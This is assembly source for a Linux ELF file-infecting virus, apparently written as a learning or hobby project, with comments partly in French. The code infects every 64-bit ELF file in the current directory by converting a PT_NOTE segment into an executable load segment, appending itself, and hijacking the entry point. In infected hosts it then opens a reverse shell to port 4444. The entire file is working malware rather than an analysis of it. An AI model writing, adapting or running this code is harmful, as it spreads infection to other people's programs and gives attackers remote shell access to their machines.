format ELF64 executable 3

SYS_EXIT        = 60
SYS_OPEN        = 2
SYS_CLOSE       = 3
SYS_WRITE       = 1
SYS_READ        = 0
SYS_EXECVE      = 59
SYS_GETDENTS64  = 217
SYS_FSTAT       = 5
SYS_LSEEK       = 8
SYS_PREAD64     = 17
SYS_PWRITE64    = 18
SYS_SYNC        = 162
STDOUT          = 1
EHDR_SIZE       = 64
ELFCLASS64      = 2
O_RDONLY        = 0
O_RDWR          = 2
SEEK_END        = 2
DIRENT_BUFSIZE  = 1024
MFD_CLOEXEC     = 1
DT_REG          = 8
PT_LOAD         = 1
PT_NOTE         = 4
PF_X            = 1
PF_R            = 4
FIRST_RUN       = 1
V_SIZE          = 2631

segment readable executable
entry v_start

v_start:
    mov r14, [rsp + 8]
    push rdx
    push rsp
    sub rsp, 5000
    mov r15, rsp

    check_first_run:
        mov rdi,  r14
        mov rsi, O_RDONLY
        xor rdx, rdx
        mov rax, SYS_OPEN
        syscall

        mov rdi, rax
        mov rsi, r15
        mov rax, SYS_FSTAT
        syscall

        cmp qword [r15 + 48], V_SIZE
        jg load_dir

        mov byte [r15 + 3000], FIRST_RUN

    load_dir:
        push "."
        mov rdi, rsp
        mov rsi, O_RDONLY
        xor rdx, rdx
        mov rax, SYS_OPEN
        syscall

        pop rdi
        cmp rax, 0
        jbe v_stop

        mov rdi, rax
        lea rsi, [r15 + 400]
        mov rdx, DIRENT_BUFSIZE
        mov rax, SYS_GETDENTS64
        syscall

        test rax, rax
        js v_stop

        mov qword [r15 + 350], rax

        mov rax, SYS_CLOSE
        syscall

        xor rcx, rcx

    file_loop:
        push rcx
        cmp byte [rcx + r15 + 418], DT_REG
        jne .continue

        .open_target_file:
            lea rdi, [rcx + r15 + 419]
            mov rsi, O_RDWR
            xor rdx, rdx
            mov rax, SYS_OPEN
            syscall

            cmp rax, 0
            jbe .continue
            mov r9, rax

        .read_ehdr:
            mov rdi, r9
            lea rsi, [r15 + 144]
            mov rdx, EHDR_SIZE
            mov r10, 0
            mov rax, SYS_PREAD64
            syscall

        .is_elf:
            cmp dword [r15 + 144], 0x464c457f
            jnz .close_file

        .is_64:
            cmp byte [r15 + 148], ELFCLASS64
            jne .close_file

        .is_infected:
            cmp dword [r15 + 152], 0x005a4d54
            jz .close_file

            mov r8, [r15 + 176]
            xor rbx, rbx
            xor r14, r14

        .loop_phdr:
            mov rdi, r9
            lea rsi, [r15 + 208]
            mov dx, word [r15 + 198]
            mov r10, r8
            mov rax, SYS_PREAD64
            syscall

            cmp byte [r15 + 208], PT_NOTE
            jz .infect

            inc rbx
            cmp bx, word [r15 + 200]
            jge .close_file

            add r8w, word [r15 + 198]
            jnz .loop_phdr

        .infect:
            .get_target_phdr_file_offset:
                mov ax, bx
                mov dx, word [r15 + 198]
                imul dx
                mov r14w, ax
                add r14, [r15 + 176]

            .file_info:
                mov rdi, r9
                mov rsi, r15
                mov rax, SYS_FSTAT
                syscall

            .append_virus:
                mov rdi, r9
                mov rsi, 0
                mov rdx, SEEK_END
                mov rax, SYS_LSEEK
                syscall
                push rax

                call .delta
                .delta:
                    pop rbp
                    sub rbp, .delta

                mov rdi, r9
                lea rsi, [rbp + v_start]
                mov rdx, v_stop - v_start
                mov r10, rax
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .patch_phdr:
                mov dword [r15 + 208], PT_LOAD
                mov dword [r15 + 212], PF_R or PF_X
                pop rax
                mov [r15 + 216], rax
                mov r13, [r15 + 48]
                add r13, 0xc000000
                mov [r15 + 224], r13
                mov qword [r15 + 256], 0x200000
                add qword [r15 + 240], v_stop - v_start + 5
                add qword [r15 + 248], v_stop - v_start + 5

                mov rdi, r9
                mov rsi, r15
                lea rsi, [r15 + 208]
                mov dx, word [r15 + 198]
                mov r10, r14
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .patch_ehdr:
                mov r14, [r15 + 168]
                mov [r15 + 168], r13
                mov r13, 0x005a4d54
                mov [r15 + 152], r13

                mov rdi, r9
                lea rsi, [r15 + 144]
                mov rdx, EHDR_SIZE
                mov r10, 0
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .write_patched_jmp:
                mov rdi, r9
                mov rsi, 0
                mov rdx, SEEK_END
                mov rax, SYS_LSEEK
                syscall

                mov rdx, [r15 + 224]
                add rdx, 5
                sub r14, rdx
                sub r14, v_stop - v_start
                mov byte [r15 + 300 ], 0xe9
                mov dword [r15 + 301], r14d

                mov rdi, r9
                lea rsi, [r15 + 300]
                mov rdx, 5
                mov r10, rax
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

                mov rax, SYS_SYNC
                syscall

        .close_file:
            mov rax, SYS_CLOSE
            syscall

        .continue:
            pop rcx
            add cx, word [rcx + r15 + 416]
            cmp rcx, qword [r15 + 350]
            jne file_loop

    cmp byte [r15 + 3000], FIRST_RUN
    jnz infected_run
        call show_msg
        info_msg:
            db 'Dite bonjour au port 4444', 0xa
            info_len = $-info_msg
        show_msg:
            pop rsi
            mov rax, SYS_WRITE
            mov rdi, STDOUT
            mov rdx, info_len
            syscall
            jmp cleanup

    infected_run:
     ; Configuration de sockaddr_struct

    ; struct sockaddr_in {
    ;     short sin_family;   // 2 bytes
    ;     unsigned short sin_port; // 2 bytes
    ;     struct in_addr sin_addr; // 4 bytes
    ; };
    ; sin_family = AF_INET (2)
    ; sin_port = htons(4444) (0x115c)
    ; sin_addr = inet_addr("127.0.0.1") (0x7f000001)

    mov rdi, 0x0100007f5c110002    ; 127.0.0.1:4444, AF_INET
    push rdi
    mov rsi, rsp

    ; Create socket
    mov rax, 41                   ; syscall: socket
    mov rdi, 0x2                  ; domain: AF_INET
    mov rsi, 0x1                  ; type: SOCK_STREAM
    mov rdx, 0x6                  ; protocol: IPPROTO_TCP
    syscall
    mov rdi, rax                  ; save socket descriptor

    ; Connect to socket
    mov rax, 42                   ; syscall: connect
    mov rsi, rsp                  ; pointer to sockaddr
    mov rdx, 0x10                 ; size of sockaddr
    syscall

    ; Duplicate socket descriptor to stdin
    mov rax, 33                   ; syscall: dup2
    mov rsi, 0                    ; stdin
    syscall

    ; Duplicate socket descriptor to stdout
    mov rax, 33                   ; syscall: dup2
    mov rsi, 1                    ; stdout
    syscall

    ; Duplicate socket descriptor to stderr
    mov rax, 33                   ; syscall: dup2
    mov rsi, 2                    ; stderr
    syscall

    ; Mettre la chaîne '/bin/sh' sur la pile
    xor rdx, rdx                   ; Clear rdx
    push rdx                       ; Push null terminator
    mov rax, 0x68732f6e69622f2f    ; '//bin/sh'
    push rax
    mov rdi, rsp                   ; rdi pointe vers '/bin/sh'

    ; Spawn shell
    mov rax, 59                    ; syscall: execve
    xor rsi, rsi                   ; argv
    xor rdx, rdx                   ; envp
    syscall
        


cleanup:
    add rsp, 5000
    pop rsp
    pop rdx

v_stop:
    xor rdi, rdi
    mov rax, SYS_EXIT
    syscall
